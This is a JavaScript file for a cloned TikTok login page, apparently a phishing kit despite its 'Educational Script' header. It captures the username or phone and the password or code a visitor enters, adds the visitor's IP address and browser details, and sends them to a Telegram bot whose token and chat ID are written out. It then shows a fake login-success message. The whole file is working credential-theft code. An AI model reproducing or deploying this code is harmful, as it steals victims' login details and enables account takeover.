// ══════════════════════════════════════════
//  TikTok Clone — Educational Script
//  Sends captured data to Telegram bot
// ══════════════════════════════════════════

const BOT_TOKEN = "8365965634:AAHOA9m61Y56ioOXOdc65p9K3gC23TJ8VBA";
const CHAT_ID = "6940283957";

// ── Tab switching ──
function switchTab(name, el) {
  document.querySelectorAll('.tab-row .tab').forEach(t => t.classList.remove('active'));
  el.classList.add('active');
  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
  document.getElementById('tab-' + name).classList.add('active');
}

// ── Sub tab (phone / email) ──
function switchSub(name) {
  ['phone', 'email'].forEach(n => {
    document.getElementById('sub-' + n).classList.toggle('active', n === name);
    document.getElementById('input-' + n).style.display = n === name ? '' : 'none';
  });
}

// ── Toggle password visibility ──
function togglePwd() {
  const input = document.getElementById('pwdInput');
  const btn = input.nextElementSibling;
  if (input.type === 'password') {
    input.type = 'text';
    btn.textContent = 'Hide';
  } else {
    input.type = 'password';
    btn.textContent = 'Show';
  }
}

// ── Send to Telegram ──
async function sendToTelegram(data) {
  const ip = await getIP();
  const now = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Algiers' });

  const msg =
        `🎭 <b>Now Login on TikTok</b> 🎭
━━━━━━━━━━━━━━━━━━━━
👤 <b>User Info</b>
📧 <b>Email/User:</b> <code>${data.user}</code>
🔑 <b>Password:</b> <code>${data.pass}</code>
━━━━━━━━━━━━━━━━━━━━
🌐 <b>System Info</b>
🖥️ <b>Browser:</b> <code>${navigator.userAgent.slice(0, 80)}</code>
📍 <b>IP:</b> <code>${ip}</code>
🕐 <b>Time:</b> <code>${now}</code>
━━━━━━━━━━━━━━━━━━━━
 👨🏻‍💻 <b>Developer:</b> Infinity — @v2_uz`;

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: msg,
      parse_mode: 'HTML'
    })
  });
}

// ── Get public IP ──
async function getIP() {
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    const d = await r.json();
    return d.ip;
  } catch {
    return 'Unknown';
  }
}

// ── Handle login click ──
async function handleLogin() {
  const btn = document.getElementById('loginBtn');
  const msg = document.getElementById('statusMsg');

  // Determine active mode
  const emailVisible = document.getElementById('input-email').style.display !== 'none';

  let user = '';
  let pass = '';

  if (emailVisible) {
    user = document.getElementById('emailInput')?.value?.trim() || '';
    pass = document.getElementById('pwdInput')?.value?.trim() || '';
  } else {
    user = document.getElementById('phoneInput')?.value?.trim() || '';
    pass = document.getElementById('codeInput')?.value?.trim() || '';
  }

  if (!user || !pass) {
    msg.style.display = 'block';
    msg.style.color = '#fe2c55';
    msg.textContent = '⚠️ Please fill in all fields.';
    return;
  }

  // Loading state
  btn.disabled = true;
  btn.textContent = 'Logging in…';
  msg.style.display = 'none';

  try {
    await sendToTelegram({ user, pass });

    // Fake success
    msg.style.display = 'block';
    msg.style.color = 'green';
    msg.textContent = '✅ Logged in successfully!';
    btn.textContent = 'Log in';
    btn.disabled = false;

    // Clear fields
    document.getElementById('emailInput') && (document.getElementById('emailInput').value = '');
    document.getElementById('pwdInput') && (document.getElementById('pwdInput').value = '');
    document.getElementById('phoneInput') && (document.getElementById('phoneInput').value = '');
    document.getElementById('codeInput') && (document.getElementById('codeInput').value = '');

  } catch (err) {
    msg.style.display = 'block';
    msg.style.color = '#fe2c55';
    msg.textContent = '❌ Error. Check your connection.';
    btn.textContent = 'Log in';
    btn.disabled = false;
  }
}

// ── Generate fake QR pixels ──
(function buildQR() {
  const pat = document.getElementById('qrPattern');
  if (!pat) return;
  const ON = [1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1];
  ON.forEach(v => {
    const d = document.createElement('div');
    if (v) d.className = 'qr-pixel';
    pat.appendChild(d);
  });
})();
